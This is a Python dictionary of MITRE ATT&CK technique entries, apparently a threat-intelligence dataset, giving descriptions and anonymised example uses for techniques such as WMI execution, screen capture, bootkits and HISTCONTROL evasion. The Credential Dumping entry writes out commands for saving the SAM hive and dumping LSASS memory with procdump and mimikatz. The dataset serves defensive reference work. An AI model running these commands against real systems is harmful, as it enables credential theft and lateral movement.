d = {
  "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6": {
    "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
    "example_uses": [
      "The author of  submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.",
      "apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.",
      "Find-AVSignature AntivirusBypass module can be used to locate single byte anti-virus signatures.",
      "has been known to remove indicators of compromise from tools.",
      "Analysis of  has shown that it regularly undergoes technical improvements to evade anti-virus detection.",
      "Based on comparison of  versions,  made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.",
      "has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.",
      "includes a capability to modify the \"beacon\" payload to eliminate known signatures or unpacking methods.",
      "has updated and modified its malware, resulting in different hash values that evade detection."
    ],
    "id": "T1066",
    "name": "Indicator Removal from Tools",
    "similar_words": [
      "Indicator Removal from Tools"
    ]
  },
  "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055": {
    "description": "Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)",
    "example_uses": [
      "has used WMI for execution.",
      "A  tool can use WMI to execute a binary.",
      "collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).",
      "uses WMI to perform discovery techniques.",
      "uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.",
      "can use WMI to execute commands.",
      "installer uses WMI to search for antivirus display names.",
      "uses WMI to perform process monitoring.",
      "uses various WMI queries to check if the sample is running in a sandbox.",
      "has used WMI for execution.",
      "malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.  has also used WMIC during and post compromise cleanup activities.",
      "Invoke-WmiCommand CodeExecution module uses WMI to execute and retrieve the output from a  payload.",
      "can use WMI queries to retrieve data from compromised hosts.",
      "may use WMI when collecting information about a victim.",
      "The  dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.",
      "can use WMI to deliver a payload to a remote host.",
      "uses a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.",
      "A  2 plug-in uses WMI to gather victim host details.",
      "can use WMI queries to gather system information.",
      "is capable of running WMI queries.",
      "malware gathers system information via Windows Management Instrumentation (WMI).",
      "malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.",
      "used WMI to steal credentials and execute backdoors at a future time.",
      "The  group is known to utilize WMI for lateral movement."
    ],
    "id": "T1047",
    "name": "Windows Management Instrumentation",
    "similar_words": [
      "Windows Management Instrumentation"
    ]
  },
  "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8": {
    "description": "~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed.\n\nMac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling ~/.bash_profile each time instead of ~/.bashrc.\n\nThese files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell  (Citation: amnesia malware).",
    "example_uses": [],
    "id": "T1156",
    "name": ".bash_profile and .bashrc",
    "similar_words": [
      ".bash_profile and .bashrc"
    ]
  },
  "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688": {
    "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.\n\n### Mac\n\nOn OSX, the native command screencapture is used to capture screenshots.\n\n### Linux\n\nOn Linux, there is the native command xwd. (Citation: Antiquated Mac Malware)",
    "example_uses": [
      "is capable of taking screen captures.",
      "captured screenshots and desktop video recordings.",
      "performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.",
      "captures screenshots based on specific keywords in the window’s title.",
      "has a tool called CANDYKING to capture a screenshot of user's desktop.",
      "has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil).",
      "has the capability to capture screenshots.",
      "captures screenshots of the victim’s screen.",
      "can capture screenshots of the desktop over multiple monitors.",
      "is capable of taking an image of and uploading the current desktop.",
      "takes screenshots of the user's desktop.",
      "takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process.",
      "has the capability to take screenshots of the victim’s machine.",
      "collects screenshots of the victim machine.",
      "can take screenshots.",
      "captures screenshots of the infected system.",
      "can capture screenshots of the victim’s machine.",
      "took screen shots using their Windows malware.",
      "can capture desktop screenshots in the PNG format and send them to the C2 server.",
      "has a command named $screenshot that may be responsible for taking screenshots of the victim machine.",
      "can perform screen captures of the victim’s machine.",
      "can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.",
      "captures the content of the desktop with the screencapture binary.",
      "can capture the victim's screen.",
      "can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.",
      "Get-TimedScreenshot Exfiltration module can take screenshots at regular intervals.",
      "can capture screenshots.",
      "is capable of performing screen captures.",
      "is capable of capturing screenshots.",
      "includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host.",
      "is capable of taking screenshots.",
      "A  variant takes screenshots by simulating the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image.",
      "can perform screen capturing.",
      "can retrieve screenshots from compromised hosts.",
      "has used a tool to capture screenshots.",
      "is capable of performing screen captures.",
      "can take screenshots.",
      "can capture a screenshot from a victim.",
      "malware can take a screenshot and upload the file to its C2 server.",
      "contains a command to perform screen captures.",
      "has the ability to obtain screenshots of the compromised system.",
      "has a command to take a screenshot and send it to the C2 server.",
      "\"beacon\" payload is capable of capturing screen shots.",
      "takes periodic screenshots and exfiltrates them.",
      "is capable of taking screenshots.",
      "contains a module that captures screenshots of the victim's desktop.",
      "can obtain screenshots from the victim.",
      "can take regular screenshots when certain applications are open that are sent to the command and control server.",
      "has the ability to initiate keylogging and screen captures.",
      "has the capability to capture screenshots.",
      "can capture screenshots at a configurable interval.",
      "contains screen capture functionality.",
      "can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.",
      "can take a desktop screenshot and save the file into \\ProgramData\\Mail\\MailAg\\shot.png.",
      "captured screenshots and sent them out to a C2 server.",
      "can capture screenshots.",
      "can capture screenshots.",
      "contains the takeScreenShot (along with startTakeScreenShot and stopTakeScreenShot) functions to take screenshots using the CGGetActiveDisplayList, CGDisplayCreateImage, and NSImage:initWithCGImage methods.",
      "takes screenshots of the compromised system's desktop and saves them to C:\\system\\screenshot.bmp for exfiltration every 60 minutes.",
      "Malware used by  is capable of watching the victim's screen.",
      "has used tools to take screenshots from victims."
    ],
    "id": "T1113",
    "name": "Screen Capture",
    "similar_words": [
      "Screen Capture"
    ]
  },
  "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d": {
    "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
    "example_uses": [
      "Some  variants incorporate an MBR rootkit.",
      "is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.",
      "is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.",
      "malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.",
      "has deployed a bootkit along with  to ensure its persistence on the victim. The bootkit shares code with some variants of ."
    ],
    "id": "T1067",
    "name": "Bootkit",
    "similar_words": [
      "Bootkit"
    ]
  },
  "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334": {
    "description": "### Windows\n\nWindows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.\n\nIf adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\n\n### Mac\n\nMac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.",
    "example_uses": [
      "An  loader Trojan adds the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence.",
      "has registered a Windows shell script under the Registry key HKCU\\Environment\\UserInitMprLogonScript to establish persistence."
    ],
    "id": "T1037",
    "name": "Logon Scripts",
    "similar_words": [
      "Logon Scripts"
    ]
  },
  "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104": {
    "description": "### Windows\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.\n\n### Mac\n\nOn Mac, the currently logged in user can be identified with users,w, and who.\n\n### Linux\n\nOn Linux, the currently logged in user can be identified with w and who.",
    "example_uses": [
      "used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.",
      "can identify logged in users across the domain and views user sessions.",
      "gathers the username from the victim’s machine.",
      "collects registered owner details by using the commands systeminfo and net config workstation.",
      "can gather the username from the victim’s machine.",
      "collects the victim's username.",
      "identifies the victim username.",
      "used the command query user on victim hosts.",
      "collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.",
      "gathers the victim username.",
      "collects the username from the victim’s machine.",
      "collects the victim username along with other account information (account type, description, full name, SID and status).",
      "lists local users and session information.",
      "runs whoami on the victim’s machine.",
      "has the capability to gather the username from the victim's machine.",
      "gathers information on users.",
      "has the capability to collect the current logged on user’s username from a machine.",
      "obtains the victim username and encrypts the information to send over its C2 channel.",
      "collects the victim’s username and whether that user is an admin.",
      "gathers user names from infected hosts.",
      "runs the whoami and query user commands.",
      "collects the victim’s username.",
      "executes the whoami on the victim’s machine.",
      "can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.",
      "can collect the victim user name.",
      "can obtain the victim user name.",
      "can gather information on the victim username.",
      "collects the username from the victim.",
      "collects the victim username and sends it to the C2 server.",
      "may collect information about the currently logged in user by running whoami on a victim.",
      "malware has obtained the victim username and sent it to the C2 server.",
      "collects the current username and sends it to the C2 server.",
      "has run whoami on a victim.",
      "collects the victim's username.",
      "obtains the current user's security identifier.",
      "A Linux version of  checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges.  also gathers the username of the victim.",
      "uses NetUser-GetInfo to identify that it is running under an “Admin” account on the local system.",
      "collects the current username from the victim.",
      "has used Meterpreter to enumerate users on remote systems.",
      "sends the logged-on username to its hard-coded C2.",
      "can obtain information about the victim usernames.",
      "runs tests to determine the privilege level of the compromised user.",
      "obtains the victim username and saves it to a file.",
      "The OsInfo function in  collects the current running username.",
      "can obtain the victim username and permissions.",
      "gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.",
      "has commands to get the current user's name and SID.",
      "contains the getInfoOSX function to return the OS X version as well as the current user.",
      "obtains the victim username.",
      "A module in  collects information from the victim about the current user name.",
      "can obtain information about the logged on user both locally and for Remote Desktop sessions.",
      "can obtain information about the current user.",
      "collects the account name of the logged-in user and sends it to the C2.",
      "can gather the victim user name.",
      "A  file stealer can gather the victim's username to send to a C2 server.",
      "collected the victim username and whether it was running as admin, then sent the information to its C2 server.",
      "malware gathers the registered user and primary owner name via WMI.",
      "Various  malware enumerates logged-on users.",
      "An  downloader uses the Windows command \"cmd.exe\" /C whoami to verify that it is running with the elevated privileges of “System.”"
    ],
    "id": "T1033",
    "name": "System Owner/User Discovery",
    "similar_words": [
      "System Owner/User Discovery"
    ]
  },
  "attack-pattern--04ee0cb7-dac3-4c6c-9387-4c6aa096f4cf": {
    "description": "The configurations for how applications run on macOS and OS X are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window  (Citation: Antiquated Mac Malware).",
    "example_uses": [],
    "id": "T1143",
    "name": "Hidden Window",
    "similar_words": [
      "Hidden Window"
    ]
  },
  "attack-pattern--04ef4356-8926-45e2-9441-634b6f3dcecb": {
    "description": "Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies (Citation: Writing Bad Malware for OSX). There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time (Citation: Malware Persistence on OS X).",
    "example_uses": [],
    "id": "T1161",
    "name": "LC_LOAD_DYLIB Addition",
    "similar_words": [
      "LC_LOAD_DYLIB Addition"
    ]
  },
  "attack-pattern--06780952-177c-4247-b978-79c357fb311f": {
    "description": "Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as /Library/Preferences (which execute with elevated privileges) and ~/Library/Preferences (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)",
    "example_uses": [],
    "id": "T1150",
    "name": "Plist Modification",
    "similar_words": [
      "Plist Modification"
    ]
  },
  "attack-pattern--086952c4-5b90-4185-b573-02bad8e11953": {
    "description": "The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
    "example_uses": [],
    "id": "T1148",
    "name": "HISTCONTROL",
    "similar_words": [
      "HISTCONTROL"
    ]
  },
  "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22": {
    "description": "Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\n### Windows\n\n#### SAM (Security Accounts Manager)\n\nThe SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):\n\n* reg save HKLM\\sam sam\n* reg save HKLM\\system system\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\n#### Cached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using PBKDF2.\n\n#### Local Security Authority (LSA) Secrets\n\nWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.\n \nWhen services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.\nWindows 10 adds protections for LSA Secrets described in Mitigation.\n\n#### NTDS from Domain Controller\n\nActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)\n \nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n#### Group Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nNotes:\nOn the SYSVOL share, the following can be used to enumerate potential XML files.\ndir /s * .xml\n\n#### Service Principal Names (SPNs)\n\nSee [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n\n#### Plaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.\n\nSSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.\n\nThe following SSPs can be used to access credentials:\n\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\nCredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)\n \nThe following tools can be used to enumerate credentials:\n\n* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n* procdump -ma lsass.exe lsass_dump\n\nLocally, mimikatz can be run:\n\n* sekurlsa::Minidump lsassdump.dmp\n* sekurlsa::logonPasswords\n\n#### DCSync\n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\n### Linux\n\n#### Proc filesystem\n\nThe /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.",
    "example_uses": [
      "obtains Windows logon password details.",
      "stole domain credentials from Microsoft Active Directory Domain Controller and leveraged .",
      "leverages  and  to steal credentials.",
      "can gather hashed passwords by dumping SAM/SECURITY hive and gathers domain controller hashes from NTDS.",
      "leveraged  to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers.",
      "steals credentials stored in Web browsers by querying the sqlite database and leveraging the Windows Vault mechanism.",
      "dropped and executed SecretsDump and CrackMapExec, tools that can dump password hashes.",
      "leveraged the tool LaZagne for retrieving login and password information.",
      "can gather browser usernames and passwords.",
      "can obtain passwords from common browsers and FTP clients.",
      "executes  using PowerShell and can also perform pass-the-ticket and use Lazagne for harvesting credentials.",
      "has performed credential dumping with  and Lazagne.",
      "has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.",
      "harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).",
      "has used keyloggers that are also capable of dumping credentials.",
      "can perform credential dumping.",
      "contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences, Windows vault credential objects, or using .",
      "can dump process memory and extract clear-text credentials.",
      "has used various tools to perform credential dumping.",
      "has used credential dumping tools such as  and Lazagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.",
      "has used credential dumping tools.",
      "is capable of stealing Outlook passwords.",
      "has dumped credentials from victims. Specifically, the group has used the tool GET5 Penetrator to look for remote login and hard-coded credentials.",
      "uses credential dumpers such as  and  to extract cached credentials from Windows systems.",
      "can dump active logon session password hashes from the lsass process.",
      "has the capability to gather NTLM password information.",
      "can be used to dump credentials.",
      "can dump Windows password hashes and LSA secrets.",
      "has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.",
      "can extract cached password hashes from a system’s registry.",
      "collects user credentials, including passwords, for various programs and browsers, including popular instant messaging applications, Web browsers, and email clients. Windows account hashes, domain accounts, and LSA secrets are also collected, as are WLAN keys.",
      "dumps usernames and passwords from Firefox, Internet Explorer, and Outlook.",
      "steals credentials from its victims.",
      "Some  samples contain a publicly available Web browser password recovery tool.",
      "collects credentials from Internet Explorer, Mozilla Firefox, Eudora, and several email clients.",
      "performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.",
      "is capable of stealing usernames and passwords from browsers on the victim machine.",
      "can recover hashed passwords.",
      "steals credentials from compromised hosts. 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  include ones associated with The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, Netscape Navigator, Mozilla Firefox, Mozilla Thunderbird, Internet Explorer, Microsoft Outlook, WinInet Credential Cache, and Lightweight Directory Access Protocol (LDAP).",
      "can dump credentials.",
      "can dump Windows password hashes.",
      "Password stealer and NTLM stealer modules in  harvest stored credentials from the victim, including credentials used as part of Windows NTLM user authentication.  has also executed  for further victim penetration.",
      "A module in  collects passwords stored in applications installed on the victim.",
      "can dump the SAM database.",
      "can dump passwords and save them into \\ProgramData\\Mail\\MailAg\\pwds.txt.",
      "contains a module to steal credentials from Web browsers on the victim machine.",
      "steals credentials stored inside Internet Explorer.",
      "has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to dump credentials any time a domain, local user, or administrator logs in or changes a password.",
      "dumped the login data database from \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.",
      "malware gathers passwords from multiple sources, including Windows Credential Vault, Internet Explorer, Firefox, Chrome, and Outlook.",
      "used a signed credential-dumping tool to obtain victim account credentials.",
      "has used  for credential dumping, as well as Metasploit’s  NTDSGRAB module to obtain a copy of the victim's Active Directory database.",
      "conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.",
      "actors have used  and a modified version of  called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.",
      "has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument \"dig.\" The group has also used a tools to dump passwords from browsers.",
      "used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.",
      "regularly deploys both publicly available and custom password retrieval tools on victims.",
      "has been known to use credential dumping.",
      "has dumped credentials, including by using .",
      "has been known to dump credentials.",
      "has been known to dump credentials."
    ],
    "id": "T1003",
    "name": "Credential Dumping",
    "similar_words": [
      "Credential Dumping"
    ]
  },
  "attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65": {
    "description": "The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)\n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via <file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries can use this functionality as a way to execute arbitrary code on a system.",
    "example_uses": [
      "can load a DLL using the LoadLibrary API.",
      "creates a backdoor through which remote attackers can load and call DLL functions."
    ],
    "id": "T1129",
    "name": "Execution through Module Load",
    "similar_words": [
      "Execution through Module Load"
    ]
  },
  "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5": {
    "description": "Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)",
    "example_uses": [],
    "id": "T1006",
    "name": "File System Logical Offsets",
    "similar_words": [
      "File System Logical Offsets"
    ]
  },
  "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a": {
    "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the 